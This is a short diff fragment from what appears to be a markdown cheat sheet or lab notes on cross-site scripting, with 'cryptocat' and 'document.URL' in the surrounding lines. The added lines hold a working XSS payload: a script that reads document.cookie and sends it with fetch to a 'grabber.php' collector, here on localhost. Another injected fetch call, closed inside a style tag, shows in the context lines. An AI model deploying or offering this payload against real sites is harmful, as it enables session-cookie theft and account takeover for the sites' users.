@@ -932,7 +932,15 @@ body: "username=cryptocat",
 headers: { "Content-Type": "application/x-www-form-urlencoded" },
 
 });"></style>
-
+```
+>-
+```
+<script>
+  fetch('http://localhost/XSS/grabber.php?c=' + document.cookie)
+    .then(response => console.log('Cookie sent:', document.cookie))
+    .catch(error => console.error('Error sending cookie:', error));
+</script>
+```
 >-commom source view
 ```
 document.URL
